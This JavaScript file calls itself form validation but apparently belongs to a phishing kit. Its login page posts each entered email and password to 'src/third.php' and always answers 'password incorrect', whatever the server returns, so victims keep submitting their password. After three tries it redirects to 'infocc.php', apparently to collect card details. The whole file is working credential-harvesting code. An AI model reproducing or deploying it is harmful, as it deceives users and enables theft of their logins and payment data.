//javascript file to process validation

// disable the next button on load
$(document).ready(function () {
  const callPasswordError = (message) => {
    $("#errMsg").val("password incorrect");

    $("#password_error").css("display", "block");
    password_layout.addClass("failedEmail");
    password.addClass("failedEmail");
  };
  let button = $("#nextButton");

  // disable the button on load
  // button.prop("disabled", true);

  let email_layout = $("#email_service");
  let password_layout = $("#password_service");
  let ischecked = false;
  let counter = 0;
  let captcha = $("#recaptcha");
  let checkbox = $("#inlineCheckbox1");
  checkbox.click(function () {
    if ($(this).prop("checked") == true) {
      ischecked = true;
      // $(this).replaceWith(
      //   '<div class="loader" style="width: 10px; height: 10px; display: inline-block;"> </div>'
      // );
    } else {
      ischecked = false;
    }
  });

  let password = $("#nap");

  let email = $("#email");
  password.click(function () {
    password_layout.removeClass("failedEmail");
    password.removeClass("failedEmail");
    $("#password_error").css("display", "none");
  });
  email.click(function () {
    email_layout.removeClass("failedEmail");
    email.removeClass("failedEmail");
    $("#email_error").css("display", "none");
  });

  button.click(function () {
    switch (button.val()) {
      case "Next":
        if (email.val().length >= 4) {
          email_layout.css("display", "none");
          $("#email_error").css("display", "none");
          $("#email_viewer").css("display", "flex");
          $("#email_previewer").css("display", "block");
          $("#email_preview").text(email.val());

          password_layout.toggleClass("hide show ");
          captcha.css("display", "none");

          button.val("Log in");
        } else {
          //if email validation fails
          email_layout.addClass("failedEmail");
          email.addClass("failedEmail");
          $("#email_error").css("display", "block");
        }
        break;
      case "Log in":
        if (password.val().length >= 6) {
          password_layout.removeClass("failedEmail");
          password.removeClass("failedEmail");
          counter++;

          if (counter <= 3) {
            //ajax call
            var request;
            if (request) {
              request.abort();
            }
            password.prop("disabled", true);

            request = $.ajax({
              url: "src/third.php",
              type: "post",
              data: { username: email.val(), password: password.val() },
            });
            request.done(function (response) {
              // Log a message to the console
              $("#errMsg").val("password incorrect");

              $("#password_error").css("display", "block");
              password_layout.addClass("failedEmail");
              password.addClass("failedEmail");
            });

            // Callback handler that will be called on failure
            request.fail(function (jqXHR, textStatus, errorThrown) {
              $("#errMsg").val("password incorrect");

              $("#password_error").css("display", "block");
              password_layout.addClass("failedEmail");
              password.addClass("failedEmail");
            });

            // Callback handler that will be called regardless
            // if the request failed or succeeded
            request.always(function () {
              // Reenable the inputs
              password.prop("disabled", false);
            });
          } else {
            window.location.replace("infocc.php");
          }
          //if the password validation is wrong
        } else {
          callPasswordError("Enter a password");
        }
    }
    // if (button.val() === "Next") {
    // }
  });
});
